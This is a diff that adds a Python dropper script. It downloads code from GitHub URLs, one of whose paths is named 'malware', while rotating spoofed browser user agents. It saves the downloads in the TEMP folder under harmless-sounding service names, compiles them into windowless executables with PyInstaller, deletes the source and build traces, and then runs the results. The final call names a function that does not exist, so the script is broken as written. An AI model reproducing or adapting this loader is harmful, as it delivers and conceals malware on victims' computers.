@@ -1,1 +1,119 @@
+import urllib.request
+import os
+import subprocess
+import random
+import shutil
 
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
+]
+
+def fetch_python_code(url):
+    user_agent = random.choice(user_agents)
+    headers = {'User-Agent': user_agent}
+    req = urllib.request.Request(url, headers=headers)
+    try:
+        with urllib.request.urlopen(req) as response:
+            return response.read().decode('utf-8')
+    except Exception as e:
+        print(f"Error fetching URL {url}: {e}")
+        return None
+
+def write_python_file(code, filename):
+    if code:
+        temp_dir = os.getenv('TEMP')
+        py_file_path = os.path.join(temp_dir, filename)
+        print(f"Writing to {py_file_path}")
+        with open(py_file_path, 'w', encoding='utf-8') as f:
+            f.write(code)
+        return py_file_path
+    return None
+
+def compile_python_to_exe(py_file_path):
+    if py_file_path:
+        try:
+            print(f"Compiling {py_file_path}")
+            temp_dir = os.getenv('TEMP')
+
+            dist_folder = os.path.join(temp_dir, "dist")
+            build_folder = os.path.join(temp_dir, "build")
+            
+            subprocess.run([
+                'pyinstaller',
+                '--onefile',
+                '--noconsole',
+                '--icon=NONE',
+                f'--distpath={dist_folder}',
+                f'--workpath={build_folder}',
+                py_file_path
+            ], check=True)
+            
+            exe_file_path = os.path.join(dist_folder, os.path.basename(py_file_path).replace(".py", ".exe"))
+            
+            if os.path.exists(exe_file_path):
+                exe_dest = os.path.join(temp_dir, os.path.basename(exe_file_path))
+                shutil.move(exe_file_path, exe_dest)
+                print(f"Moved {exe_file_path} to {exe_dest}")
+                return exe_dest
+            else:
+                print(f"Error: {exe_file_path} not found in dist folder")
+        except Exception as e:
+            print(f"Error compiling {py_file_path}: {e}")
+    return None
+
+def execute_all_exes(exe_file_paths):
+    processes = []
+    for exe_file_path in exe_file_paths:
+        try:
+            print(f"Executing {exe_file_path}")
+            process = subprocess.Popen([exe_file_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
+            processes.append(process)
+        except Exception as e:
+            print(f"Error executing {exe_file_path}: {e}")
+
+    for process in processes:
+        process.wait()
+
+def clean_up(py_file_path, dist_folder, build_folder):
+    if os.path.exists(py_file_path):
+        os.remove(py_file_path)
+        print(f"Deleted Python file: {py_file_path}")
+    
+    for folder in [dist_folder, build_folder]:
+        if os.path.exists(folder):
+            if os.path.isdir(folder):
+                shutil.rmtree(folder)
+                print(f"Deleted folder: {folder}")
+
+urls_and_filenames = [
+    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/malware", "NetworkIntegrityService.py"),
+    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog1", "SystemResourceMonitor.py"),
+    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog2", "SecurityHealthCheck.py"),
+]
+
+temp_dir = os.getenv('TEMP')
+python_files = []
+for url, filename in urls_and_filenames:
+    code = fetch_python_code(url)
+    if code:
+        py_file_path = write_python_file(code, filename)
+        if py_file_path:
+            python_files.append(py_file_path)
+
+exe_files = []
+for py_file_path in python_files:
+    exe_file_path = compile_python_to_exe(py_file_path)
+    if exe_file_path:
+        exe_files.append(exe_file_path)
+
+for py_file_path in python_files:
+    dist_folder = os.path.join(temp_dir, "dist")
+    build_folder = os.path.join(temp_dir, "build")
+    clean_up(py_file_path, dist_folder, build_folder)
+
+for exe_file_path in exe_files:
+    execute_exe_file(exe_file_path)
